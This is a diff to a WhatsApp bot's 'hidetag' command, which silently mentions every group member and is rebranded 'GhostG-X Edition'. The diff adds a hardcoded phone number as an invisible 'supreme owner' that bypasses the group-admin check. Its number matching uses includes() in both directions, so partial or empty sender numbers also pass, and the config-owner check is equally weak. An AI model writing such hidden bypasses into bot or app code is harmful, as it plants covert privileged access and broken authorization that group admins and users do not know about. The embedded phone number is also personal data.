@@ -1,35 +1,71 @@
 /**
- * HideTag Command
- * Silently tag all group members without listing them
- * Supports text, images, videos, and stickers
+ * HideTag Command - Silently tag all group members without listing them
+ * GhostG-X Edition
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const { downloadMediaMessage } = require('@whiskeysockets/baileys');
-const config = require ('../../config.js');
+const config = require('../../config.js');
+
+// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
+
+const prefix = config.prefix || '.';
 
 module.exports = {
   name: 'hidetag',
   aliases: ['tag'],
-  description: 'Silently tag all members in the group',
-  usage: '.tag <message> (or reply to media)',
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ɪɴᴠᴏǫᴜᴇ ᴅɪsᴄʀᴇᴛᴇᴍᴇɴᴛ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  usage: `${prefix}hidetag <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
-  
+
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
+    
     try {
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
+      if (!extra.isAdmin && !isMe) {
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+      }
+
       const groupMetadata = await sock.groupMetadata(extra.from);
       const participants = groupMetadata.participants || [];
       const mentions = participants.map((p) => p.id || p.lid).filter(Boolean);
-      
-      // Check if message is a reply to media
+
+      // Vérifie si le message est une réponse à un média
       const ctxInfo = msg.message?.extendedTextMessage?.contextInfo;
       let targetMessage = msg;
-      
+
       if (ctxInfo?.quotedMessage) {
-        // Build target message for download
+        // Construit le message cible pour le téléchargement
         targetMessage = {
           key: {
             remoteJid: extra.from,
@@ -39,15 +75,15 @@ module.exports = {
           message: ctxInfo.quotedMessage,
         };
       }
-      
-      // Check what type of media we're dealing with
+
+      // Vérifie le type de média
       const mediaMessage = 
         targetMessage.message?.imageMessage ||
         targetMessage.message?.videoMessage ||
         targetMessage.message?.stickerMessage;
-      
+
       if (mediaMessage) {
-        // Download and resend media with mentions
+        // Téléchargement et renvoi du média avec mentions
         try {
           const mediaBuffer = await downloadMediaMessage(
             targetMessage,
@@ -55,7 +91,7 @@ module.exports = {
             {},
             { logger: undefined, reuploadRequest: sock.updateMediaMessage }
           );
-          
+
           if (targetMessage.message?.imageMessage) {
             const text = args.join(' ') || targetMessage.message.imageMessage.caption || '';
             await sock.sendMessage(extra.from, {
@@ -75,8 +111,8 @@ module.exports = {
               sticker: mediaBuffer,
               mentions
             }, { quoted: msg });
-            
-            // If there's text, send it separately
+
+            // Si du texte accompagne le sticker, l'envoyer séparément
             const text = args.join(' ');
             if (text) {
               await sock.sendMessage(extra.from, { text, mentions }, { quoted: msg });
@@ -84,33 +120,32 @@ module.exports = {
           }
         } catch (mediaError) {
           console.error('Error downloading media for hidetag:', mediaError);
-          // Fallback to text with mentions
+          // Secours en texte simple avec mentions en cas de bug de téléchargement
           const text = args.join(' ') || ' ';
           await sock.sendMessage(extra.from, { text, mentions }, { quoted: msg });
         }
       } else {
-        // Check if replying to a message - send exact message content
+        // Si c'est une réponse à un message texte brut
         if (ctxInfo?.quotedMessage) {
-          // Get the quoted message text
           const quotedText = ctxInfo.quotedMessage.conversation || 
                            ctxInfo.quotedMessage.extendedTextMessage?.text || 
                            args.join(' ') || ' ';
-          
+
           await sock.sendMessage(extra.from, { text: quotedText, mentions }, { quoted: msg });
         } else {
-          // Plain text message
+          // Message texte simple
           const text = args.join(' ') || ' ';
           await sock.sendMessage(extra.from, { text, mentions }, { quoted: msg });
         }
       }
     } catch (error) {
       console.error('HideTag command error:', error);
-      await extra.reply(
+      await reply(
         `╭╼━≪• *ɪɴᴠᴏᴄᴀᴛɪᴏɴ_sɪʟᴇɴᴄɪᴇᴜsᴇ* •≫━╾╮\n` +
-        `┃ *ᴇ́ᴛᴀᴛ* : ᴇ́ᴄʜᴇᴄ ❌\n` +
+        `┃ *ᴇ́ᴛᴀᴛ* : [ ᴇ́ᴄʜᴇᴄ ❌ ]\n` +
         `╰━━━━━━━━━━━━━━━╯\n\n` +
-        `*ʟ'ᴀʀᴄᴀɴᴇ ɴ'ᴀ ᴘᴀs ᴘᴜ ɪɴᴠᴏǫᴜᴇʀ ʟᴇs ᴍᴇᴍʙʀᴇs : ${error.message}*\n\n` +
-        `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+        `*❌ ${toSmallCaps('l arcane n a pas pu invoquer les membres')} : ${error.message}*\n\n` +
+        `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
       );
     }
   },
